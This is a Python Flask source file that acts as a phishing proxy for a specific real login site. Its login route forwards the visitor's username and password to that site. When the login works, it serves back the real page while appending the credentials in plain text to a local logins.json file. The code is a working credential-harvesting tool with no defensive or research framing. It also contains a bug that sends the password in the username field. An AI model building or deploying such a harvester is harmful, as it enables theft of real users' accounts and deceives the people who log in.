#import need libraries
from flask import Flask, render_template, request, redirect
from bs4 import BeautifulSoup
import requests, json
import copy

#start flask application instance
app = Flask(__name__)
URL_target="https://uicbs.org/index.php"

#define route that handle get response
@app.route("/", methods=["get"])
def main():
    return render_template("index.html")
#def login that store the user and pass value parameter
@app.route("/login")
def login():
    username = request.args.get("user")
    password = request.args.get("pass")
    dict_payload={"pass":password,"sub_login": "Login","user":password}
    result=requests.post(URL_target,dict_payload)
    if result.url!=URL_target:
        soup2= BeautifulSoup(result.text, "html.parser")
        with open("./templates/name.html", "w", encoding="utf-8") as file:
            file.write(soup2.prettify())
        with open("./logins.json", "r", encoding="utf-8") as file:
            jsons = json.loads(file.read())
            new_data = {
                "username": str(username),
                "password": str(password)
            }
#updated json
            jsons.append(new_data)
        with open("./logins.json", "w", encoding="utf-8") as file:
            file.write(json.dumps(jsons, indent=4))    
        return render_template("name.html")
    else:
        return redirect("/")


if __name__ == "__main__":
    app.run(host="0.0.0.0")